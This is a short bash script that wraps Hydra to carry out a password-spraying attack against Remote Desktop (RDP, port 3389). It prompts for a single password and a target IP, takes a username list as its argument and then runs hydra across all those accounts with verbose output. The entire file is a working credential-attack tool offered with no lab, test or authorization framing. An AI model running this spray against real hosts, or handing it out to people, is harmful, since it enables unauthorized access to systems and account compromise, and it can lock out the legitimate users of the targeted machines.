#!/bin/bash

echo "=== Hydra RDP Spraying (3389) ==="

# Input password
read -p "Enter password: " PASS

# Input target IP
read -p "Enter IP target: " IP

# Wordlist username
USERLIST="$1"

# Validate input
if [[ -z "$PASS" || -z "$IP" || -z "$USERLIST" ]]; then
    echo "[!] Usage: $0 <user_list.txt>"
    exit 1
fi

if [[ ! -f "$USERLIST" ]]; then
    echo "[!] User list not found: $USERLIST"
    exit 1
fi

echo "[*] Target: $IP:3389"
echo "[*] Password: $PASS"
echo "[*] User list: $USERLIST"

# Run Hydra
hydra -L "$USERLIST" -p "$PASS" rdp://"$IP" -t 6 -W 2 -V
